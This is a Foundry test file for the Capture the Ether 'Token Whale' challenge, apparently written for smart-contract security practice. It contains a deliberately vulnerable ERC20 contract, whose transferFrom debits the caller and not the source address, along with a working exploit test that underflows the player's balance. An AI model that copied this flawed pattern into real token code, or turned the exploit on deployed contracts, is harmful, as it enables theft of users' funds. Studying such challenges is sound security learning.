// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow

import "forge-std/Test.sol";

contract ContractTest is Test {
    TokenWhaleChallenge TokenWhaleChallengeContract;

    function testOverflow2() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);

        TokenWhaleChallengeContract = new TokenWhaleChallenge();
        TokenWhaleChallengeContract.TokenWhaleDeploy(address(this));
        console.log(
            "Player balance:",
            TokenWhaleChallengeContract.balanceOf(address(this))
        );
        TokenWhaleChallengeContract.transfer(address(alice), 800);

        vm.prank(alice);
        TokenWhaleChallengeContract.approve(address(this), 1000);
        TokenWhaleChallengeContract.transferFrom(
            address(alice),
            address(bob),
            500
        ); //exploit here

        console.log("Exploit completed, balance overflowed");
        console.log(
            "Player balance:",
            TokenWhaleChallengeContract.balanceOf(address(this))
        );
    }

    receive() external payable {}
}

contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleDeploy(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}
